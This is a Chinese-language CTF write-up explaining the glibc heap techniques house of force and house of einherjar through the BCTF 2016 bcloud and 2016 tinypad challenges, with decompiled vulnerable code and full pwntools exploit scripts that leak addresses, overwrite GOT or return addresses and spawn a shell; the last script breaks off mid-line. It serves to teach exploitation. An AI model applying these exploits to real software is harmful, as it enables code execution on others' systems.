<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><p>house of force是修改top chunk size的一种利用方法，利用demo可参考: <a href="https://github.com/shellphish/how2heap/blob/master/house_of_force.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/house_of_force.c</a></p>
<p>题目见: <a href="https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200</a></p>
<p>该利用姿势是由于libc的堆管理在malloc的时候默认top chunk的size是正确合法的，所以不会去检查top chunk的size值，这就导致了一种情况，当一个程序存在可以修改top chunk size的漏洞时，我们把top chunk的size修改成0xffffffff(x86)</p>
<p>假设这个时候的top_chunk=0x601200, 然后malloc(0xffe00020)，然后对malloc申请的size进行检查，<code>0xffe00030 &lt; top_chunk_size</code>，所以可以成功malloc内存，然后计算top_chunk的新地址：<code>0xffe00030+0x601200=0x100401230</code>, 因为是x86环境，最高位溢出了，所以<code>top_chunk=0x401230</code></p>
<p>然后下次我们再malloc的时候，返回的地址就是<code>0x401238</code></p>
<p>下面，我们再通过2016年bctf的一道题目来加强对该利用方式的理解</p>
<h2 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h2><p>有一个read_buffer函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">int read_buffer(int input, int len, char a3)</div><div class="line">&#123;</div><div class="line">  char buf;</div><div class="line">  int i;</div><div class="line"></div><div class="line">  for ( i = 0; i &lt; len; ++i )</div><div class="line">  &#123;</div><div class="line">    if ( read(0, &amp;buf, 1u) &lt;= 0 )</div><div class="line">      exit(-1);</div><div class="line">    if ( buf == a3 )</div><div class="line">      break;</div><div class="line">    *(_BYTE *)(input + i) = buf;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)(i + input) = 0;         // off by one</div><div class="line">  return i;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在注释里也已经标出来了，该函数存在off_by_one漏洞，会溢出一个<code>\x00</code></p>
<p>然后存在内存泄露的是需要输入username的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">void welcom_user()</div><div class="line">&#123;</div><div class="line">  char s; // [esp+1Ch] [ebp-5Ch]</div><div class="line">  char *v2; // [esp+5Ch] [ebp-1Ch]</div><div class="line">  unsigned int v3; // [esp+6Ch] [ebp-Ch]</div><div class="line"></div><div class="line">  memset(&amp;s, 0, 0x50u);</div><div class="line">  puts(&quot;Input your name:&quot;);</div><div class="line">  read_buffer((int)&amp;s, 0x40, &apos;\n&apos;);</div><div class="line">  v2 = (char *)malloc(0x40u);</div><div class="line">  name = (int)v2;</div><div class="line">  strcpy(v2, &amp;s);</div><div class="line">  welcom((int)v2);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看上面的注释，计算出v2变量和s变量在栈中的距离为0x40</p>
<p>当我输入0x40的a时，会把变量s填充满，然后在v1的第一个字节添加字符串结尾<code>\x00</code>，接下来，malloc的返回值赋给v2，把<code>\x00</code>给覆盖掉了，所以在strcpy函数把s的值+v2的值copy到v2指向的堆中，然后在welcom函数中输出，这样获得到了堆的地址</p>
<h2 id="修改top-chunk-size"><a href="#修改top-chunk-size" class="headerlink" title="修改top_chunk size"></a>修改top_chunk size</h2><p>之后，有一个输入org和host的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">void sub_804884E()</div><div class="line">&#123;</div><div class="line">  char org; // [esp+1Ch] [ebp-9Ch]</div><div class="line">  char *v1; // [esp+5Ch] [ebp-5Ch]</div><div class="line">  int host; // [esp+60h] [ebp-58h]</div><div class="line">  char *v3; // [esp+A4h] [ebp-14h]</div><div class="line">  unsigned int v4; // [esp+ACh] [ebp-Ch]</div><div class="line"></div><div class="line">  memset(&amp;org, 0, 0x90u);</div><div class="line">  puts(&quot;Org:&quot;);</div><div class="line">  read_buffer((int)&amp;org, 0x40, 10);</div><div class="line">  puts(&quot;Host:&quot;);</div><div class="line">  read_buffer((int)&amp;host, 0x40, 10);</div><div class="line">  v3 = (char *)malloc(0x40u);</div><div class="line">  v1 = (char *)malloc(0x40u);</div><div class="line">  org_static = (int)v1;</div><div class="line">  host_static = (int)v3;</div><div class="line">  strcpy(v3, (const char *)&amp;host);</div><div class="line">  strcpy(v1, &amp;org);</div><div class="line">  puts(&quot;OKay! Enjoy:)&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数存在和上面user函数一样的问题，我们来看看栈布局：</p>
<table>
<thead>
<tr>
<th style="text-align:center">org size=0x40</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">v1 size=0x4</td>
</tr>
<tr>
<td style="text-align:center">host size=0x40</td>
</tr>
<tr>
<td style="text-align:center">v3 size=0x4</td>
</tr>
</tbody>
</table>
<p>然后再来看看malloc两次后的堆布局：</p>
<table>
<thead>
<tr>
<th style="text-align:center">user size=0x49</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">v3 size=0x49</td>
</tr>
<tr>
<td style="text-align:center">v1 size=0x49</td>
</tr>
<tr>
<td style="text-align:center">top_chunk size=???</td>
</tr>
</tbody>
</table>
<p>v1储存的是org的值，如果org中没有<code>\x00</code>，v1中没有<code>\x00</code>，strcpy将会copy org+v1+host的值到堆中去，而堆中v1的size只有0x48，所以会导致堆溢出，可以覆盖到top_chunk的size，我们将该size赋值为0xffffffff</p>
<h2 id="控制malloc的返回值"><a href="#控制malloc的返回值" class="headerlink" title="控制malloc的返回值"></a>控制malloc的返回值</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">int new()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  signed int i; // [esp+18h] [ebp-10h]</div><div class="line">  int v2; // [esp+1Ch] [ebp-Ch]</div><div class="line"></div><div class="line">  for ( i = 0; i &lt;= 9 &amp;&amp; note_list[i]; ++i )</div><div class="line">    ;</div><div class="line">  if ( i == 10 )</div><div class="line">    return puts(&quot;Lack of space. Upgrade your account with just $100 :)&quot;);</div><div class="line">  puts(&quot;Input the length of the note content:&quot;);</div><div class="line">  v2 = get_int();</div><div class="line">  note_list[i] = (int)malloc(v2 + 4);</div><div class="line">  if ( !note_list[i] )</div><div class="line">    exit(-1);</div><div class="line">  note_length[i] = v2;</div><div class="line">  puts(&quot;Input the content:&quot;);</div><div class="line">  read_buffer(note_list[i], v2, 10);</div><div class="line">  printf(&quot;Create success, the id is %d\n&quot;, i);</div><div class="line">  result = i;</div><div class="line">  dword_804B0E0[i] = 0;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在new函数中，可以控制malloc的size大小，然后我们需要考虑控制malloc跳到哪里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">int edit()</div><div class="line">&#123;</div><div class="line">  int length;</div><div class="line">  int id; // [esp+14h] [ebp-14h]</div><div class="line">  int note; // [esp+18h] [ebp-10h]</div><div class="line"></div><div class="line">  puts(&quot;Input the id:&quot;);</div><div class="line">  id = get_int();</div><div class="line">  if ( id &lt; 0 || id &gt; 9 )</div><div class="line">    return puts(&quot;Invalid ID.&quot;);</div><div class="line">  note = note_list[id];</div><div class="line">  if ( !note )</div><div class="line">    return puts(&quot;Note has been deleted.&quot;);</div><div class="line">  length = note_length[id];</div><div class="line">  dword_804B0E0[id] = 0;</div><div class="line">  puts(&quot;Input the new content:&quot;);</div><div class="line">  read_buffer(note, length, 10);</div><div class="line">  return puts(&quot;Edit success.&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>有一个edit函数，可以编辑note_list指向地址的值，所以如果我们能控制note_list的值，就可以做到任意地址修改</p>
<p>所以我们的目的是让下一次malloc的返回值为<code>0x804B120</code>，这样需要在这一次malloc后，让<code>top_chunk=0x804B118</code></p>
<p>所以根据泄露出的heap地址计算出当前top_chunk的地址，然后再计算出本次malloc的size: <code>0x10804B118-top_chunk</code> 或者 <code>-(top_chunk-0x804B118)</code></p>
<h2 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h2><p>按照该程序的逻辑，应该在show函数中成输出note_list指向地址的值，但是该函数的功能还未实现:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">int show()</div><div class="line">&#123;</div><div class="line">  return puts(&quot;WTF? Something strange happened.&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以就需要想别的办法来泄露libc地址了</p>
<p>我使用的方法的修改free_got的值为printf的值，然后在delete函数中，<code>free(note_list[x])</code>，<code>note_list[x]</code>修改成atoi_got的地址，这样就能泄露出atoi_got的值</p>
<p>但是因为不知道libc，所以不知道printf的值，但是因为有延时绑定，所以我们能把free_got的值修改成printf_plt+6的值</p>
<p>获取到libc的地址后，可以计算出system的值，然后再把atoi_got的值修改成system地址，达到getshell的目的</p>
<p>完整payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2.7</div><div class="line"># -*- coding=utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">def new_note(len,content):</div><div class="line">    p.readuntil(&quot;---&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.readuntil(&quot;content:&quot;)</div><div class="line">    p.sendline(str(len))</div><div class="line">    p.readuntil(&quot;content:&quot;)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line">def edit_note(i, data):</div><div class="line">    p.readuntil(&quot;---&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line">    p.readuntil(&quot;id:\n&quot;)</div><div class="line">    p.sendline(str(i))</div><div class="line">    p.readuntil(&quot;content:\n&quot;)</div><div class="line">    p.sendline(data)</div><div class="line">    p.readuntil(&quot;success.&quot;)</div><div class="line"></div><div class="line">def delete_note(i):</div><div class="line">    p.readuntil(&quot;---&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;4&quot;)</div><div class="line">    p.readuntil(&quot;id:\n&quot;)</div><div class="line">    p.sendline(str(i))</div><div class="line"></div><div class="line">p = process(&quot;./bcloud&quot;)</div><div class="line">e = ELF(&quot;./bcloud&quot;)</div><div class="line">libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"># leak heap</div><div class="line">p.readuntil(&quot;name:\n&quot;)</div><div class="line">p.send(&quot;a&quot;*0x40)</div><div class="line">p.read(0x44)</div><div class="line">heap = u32(p.read(4))</div><div class="line">print &quot;heap addr: &quot; + hex(heap)</div><div class="line"></div><div class="line"># modify top chunk size to 0xffffffff</div><div class="line">p.readuntil(&quot;Org:&quot;)</div><div class="line">p.send(&quot;a&quot;*0x40)</div><div class="line">p.readuntil(&quot;Host:&quot;)</div><div class="line">p.sendline(p32(0xffffffff))</div><div class="line">p.readuntil(&quot;Enjoy:&quot;)</div><div class="line"></div><div class="line"># malloc return address:0x804B120</div><div class="line">note_list = 0x804B120</div><div class="line">new_note(0x10, &quot;aaa&quot;)</div><div class="line">new_note(-(heap+0xf4-0x804B120+8), &quot;2333&quot;)</div><div class="line"></div><div class="line"># note_list[0] = free_got</div><div class="line"># note_list[1] = atoi_got</div><div class="line"># note_list[2] = atoi_got</div><div class="line">payload = p32(e.got[&quot;free&quot;])</div><div class="line">payload += p32(e.got[&quot;atoi&quot;])</div><div class="line">payload += p32(e.got[&quot;atoi&quot;])</div><div class="line">new_note(0x100, payload)</div><div class="line"></div><div class="line"># write printf address to free_got</div><div class="line">edit_note(0, p32(e.symbols[&quot;printf&quot;]+6))</div><div class="line"></div><div class="line"># printf(atoi_got)</div><div class="line">delete_note(1)</div><div class="line">atoi_libc = u32(p.read(4))</div><div class="line">p.readuntil(&quot;success.&quot;)</div><div class="line">libc_base = atoi_libc - libc.symbols[&quot;atoi&quot;]</div><div class="line">print &quot;libc_base: &quot; + hex(libc_base)</div><div class="line"></div><div class="line"># calculate system address</div><div class="line">system = libc.symbols[&quot;system&quot;] + libc_base</div><div class="line"></div><div class="line"># write system address to atoi_got</div><div class="line">edit_note(2, p32(system))</div><div class="line"></div><div class="line"># system(&quot;/bin/sh&quot;)</div><div class="line">p.sendline(&quot;/bin/sh&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><p>house of einherjar跟house of force差不多，最终目的都是控制top chunk的值，利用demo可参考: <a href="https://github.com/shellphish/how2heap/blob/master/house_of_einherjar.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/house_of_einherjar.c</a></p>
<p>题目见: <a href="https://github.com/blendin/writeups/tree/master/2016/tinypad" target="_blank" rel="external">https://github.com/blendin/writeups/tree/master/2016/tinypad</a></p>
<p>和house of force的区别是，通过off by one把最后一个chunk的pre_inuse标志位置零，让free函数以为上一个chunk已经被free，这就要求了最后一个chunk的size必须要是0x100的倍数，要不然会check下一个chunk失败，或者和top chunk进行合并操作的时候失败。</p>
<p>然后再伪造一个chunk，计算最后一个chunk到我们伪造chunk的距离，设置为最后一个chunk的pre_size位，当free最后一个chunk时，会将伪造的chunk和当前chunk和top chunk进行unlink操作，合并成一个top chunk，从而达到将top chunk设置到我们伪造chunk的地址。</p>
<p>接下来通过2016年Second ctf的一个题来加深对该利用方法的理解：</p>
<h2 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if ( *(_QWORD *)&amp;tinypad[16 * (v11 - 1 + 16LL)] )</div><div class="line">&#123;</div><div class="line">    free(*(void **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8]);</div><div class="line">    *(_QWORD *)&amp;tinypad[16 * (v11 - 1 + 16LL)] = 0LL;</div><div class="line">    writeln((__int64)&quot;\nDeleted.&quot;, 9LL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在free了一个tinypad的时候，只把size位置零了，但是却没有把储存content的地址(<code>tinypad[16 * (v11 - 1 + 16LL) + 8]</code>)置零</p>
<p>然后在每次循环的时候，都会输出四个tinypad的信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">for ( i = 0; i &lt;= 3; ++i )</div><div class="line">    &#123;</div><div class="line">      LOBYTE(c) = i + &apos;1&apos;;</div><div class="line">    writeln((__int64)&quot;+------------------------------------------------------------------------------+\n&quot;, 81LL);</div><div class="line">      write_n((__int64)&quot; #   INDEX: &quot;, 12LL);</div><div class="line">      writeln((__int64)&amp;c, 1LL);</div><div class="line">      write_n((__int64)&quot; # CONTENT: &quot;, 12LL);</div><div class="line">      if ( *(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8] )</div><div class="line">      &#123;</div><div class="line">        v3 = strlen(*(const char **)&amp;tinypad[16 * (i + 16LL) + 8]);</div><div class="line">        writeln(*(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8], v3);</div><div class="line">      &#125;</div><div class="line">      writeln((__int64)&amp;newline, 1LL);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>所以我们能增加4个tinypad，都申请一个0x100左右的chunk，然后释放第1个和第3个，这样就能形成unsortbin双链表，其中一个fd指向arena区域，一个fd指向另一个chunk，这样就泄露出了libc地址和堆地址</p>
<h2 id="house-of-einherjar利用"><a href="#house-of-einherjar利用" class="headerlink" title="house of einherjar利用"></a>house of einherjar利用</h2><p>首先是伪造一个合法的chunk，我们发现在edit分支，能控制<code>tinypad</code>地址的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">if ( *(_QWORD *)&amp;tinypad[16 * (v11 - 1 + 16LL)] )</div><div class="line">        &#123;</div><div class="line">          c = &apos;0&apos;;</div><div class="line">          strcpy(tinypad, *(const char **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8]);</div><div class="line">          while ( toupper(c) != &apos;Y&apos; )</div><div class="line">          &#123;</div><div class="line">            write_n((__int64)&quot;CONTENT: &quot;, 9LL);</div><div class="line">            v6 = strlen(tinypad);</div><div class="line">            writeln((__int64)tinypad, v6);</div><div class="line">            write_n((__int64)&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</div><div class="line">            v7 = strlen(*(const char **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8]);</div><div class="line">            read_until((__int64)tinypad, v7, &apos;\n&apos;);        # 控制tinypad的值</div><div class="line">            writeln((__int64)&quot;Is it OK?&quot;, 9LL);</div><div class="line">            write_n((__int64)&quot;(Y/n)&gt;&gt;&gt; &quot;, 9LL);</div><div class="line">            read_until((__int64)&amp;c, 1uLL, 0xAu);</div><div class="line">          &#125;</div><div class="line">          strcpy(*(char **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8], tinypad);</div><div class="line">          writeln((__int64)&quot;\nEdited.&quot;, 8LL);</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<p>所以我们tinypad就是我们伪造的chunk，伪造的chunk如下：</p>
<p><code>&amp;tinypad</code>:</p>
<table>
<thead>
<tr>
<th style="text-align:center">pre_size(0x100)</th>
<th style="text-align:center">size(待会计算)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">fwd(&amp;tinypad)</td>
<td style="text-align:center">bck(&amp;tinypad)</td>
</tr>
<tr>
<td style="text-align:center">fwd_nextsize(&amp;tinypad)</td>
<td style="text-align:center">bck_nextsize(&amp;tinypad)</td>
</tr>
</tbody>
</table>
<p>刚才泄露内存已经释放了两个tinypad，还剩第二个和第四个tinypad，这个时候我释放第四个tinypad，这样第三个第四个将会和top_chunk合并</p>
<p>只要经过精心计算，这个时候我们再add一个tinypad，将会获得第一个tinypad(已经被释放)的堆地址，然后利用off by one漏洞:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">unsigned __int64 read_until(__int64 buf, unsigned __int64 len, unsigned int end)</div><div class="line">&#123;</div><div class="line">  int v4; // [rsp+Ch] [rbp-34h]</div><div class="line">  unsigned __int64 i; // [rsp+28h] [rbp-18h]</div><div class="line">  signed __int64 v6; // [rsp+30h] [rbp-10h]</div><div class="line"></div><div class="line">  v4 = end;</div><div class="line">  for ( i = 0LL; i &lt; len; ++i )</div><div class="line">  &#123;</div><div class="line">    v6 = read_n(0, buf + i, 1uLL);</div><div class="line">    if ( v6 &lt; 0 )</div><div class="line">      return -1LL;</div><div class="line">    if ( !v6 || *(char *)(buf + i) == v4 )</div><div class="line">      break;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)(buf + i) = 0;           // off by one</div><div class="line">  if ( i == len &amp;&amp; *(_BYTE *)(len - 1 + buf) != 10 )</div><div class="line">    dummyinput(v4);</div><div class="line">  return i;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>比如tinypad 1的大小是<code>0xf0</code>，我们申请一个<code>0xe8</code>大小的内存，就会得到tinypad 1的堆，然后可以覆盖到tinypad 2的<code>pre_size</code>，如果tinypad2的size位是0x101，则会被off by one漏洞设置为0x100</p>
<p>我们计算出tinypad2的地址，然后减去tinypad的地址，计算出offset，设置为tinypad2的pre_size和伪造chunk的size位</p>
<p>然后我们再free tinypad2，伪造的chunk和tinypad2将会和top chunk合并，这个时候top chunk的值为tinypad的地址</p>
<h2 id="bypass-Full-RELRO"><a href="#bypass-Full-RELRO" class="headerlink" title="bypass Full RELRO"></a>bypass Full RELRO</h2><p>top chunk已经被设置到tinypad地址了，tinypad+256地址开始储存着tinypad1 2 3 4的信息，所以当我们再次malloc的时候，tinypad 1 2 3 4的size和address都已经是可控的了，可以达到任意地址读，然后edit功能可以做到任意地址写</p>
<p>已经能任意地址读写了，正常思路就是写got表，然后getshell，但是发现程序开启了Full RELRO保护，got表将不可写</p>
<p>然后考虑了FILE_IO的利用方法，但是发现该程序的IO使用的都是read和write，并没有使用stdio库，故该思路也不可行</p>
<p>然后发现，在libc中有一个全局变量<code>__environ</code>, 储存着该程序环境变量的地址，而环境变量是储存在栈上的，所以可以泄露栈地址，所以可以控制rip了</p>
<p>我使用的思路是，计算出one_gadget的地址，然后把<code>ret __libc_start_main</code>改写成<code>ret one_gadget</code>，从而达到getshell的目的。</p>
<p>完整Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2</div><div class="line"># -*- coding=utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line"></div><div class="line">def add(p, size, content):</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;a&quot;)</div><div class="line">    p.readuntil(&quot;(SIZE)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(str(size))</div><div class="line">    p.readuntil(&quot;(CONTENT)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line">def delete(p, index):</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;d&quot;)</div><div class="line">    p.readuntil(&quot;(INDEX)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(str(index))</div><div class="line"></div><div class="line">def edit(p, index, content):</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;e&quot;)</div><div class="line">    p.readuntil(&quot;(INDEX)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(str(index)) </div><div class="line">    p.readuntil(&quot;(CONTENT)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(content)</div><div class="line">    p.readuntil(&quot;(Y/n)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;y&quot;)</div><div class="line"></div><div class="line">def main():</div><div class="line">    # context.log_level = &quot;debug&quot;</div><div class="line">    p = process(&quot;./tinypad&quot;)</div><div class="line">    # e = ELF(&quot;./tinypad&quot;)</div><div class="line">    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</div><div class="line"></div><div class="line">    # leak libc and heap address</div><div class="line">    add(p, 224, &quot;a&quot;*10)</div><div class="line">    add(p, 246, &quot;b&quot;*0xf0)</div><div class="line">    add(p, 256, &quot;c&quot;*0xf0)</div><div class="line">    add(p, 256, &quot;d&quot;*10)</div><div class="line">    delete(p, 3)</div><div class="line">    delete(p, 1)</div><div class="line">    # get heap address</div><div class="line">    p.readuntil(&quot;# CONTENT: &quot;)</div><div class="line">    heap = p.readline().rstrip()</div><div class="line">    heap += &quot;\x00&quot;*(8-len(heap))</div><div class="line">    heap_base = u64(heap) - 0x1f0</div><div class="line">    print &quot;heap_base address: &quot; + hex(heap_base)</div><div class="line">    # get libc address</div><div class="line">    p.readuntil(&quot;INDEX: 3&quot;)</div><div class="line">    p.readuntil(&quot;# CONTENT: &quot;)</div><div class="line">    libc_address = p.readline().strip()</div><div class="line">    libc_address += &quot;\x00&quot;*(8-len(libc_address))</div><div class="line">    libc_base = u64(libc_address) - 0x3c4b78</div><div class="line">    print &quot;libc_base address: &quot; + hex(libc_base)</div><div class="line"></div><div class="line">    # make top -&gt; tinypad(0x602040)</div><div class="line">    add(p, 232, &quot;g&quot;*224 + p64(heap_base+240-0x602040))</div><div class="line">    delete(p, 4)</div><div class="line">    payload = 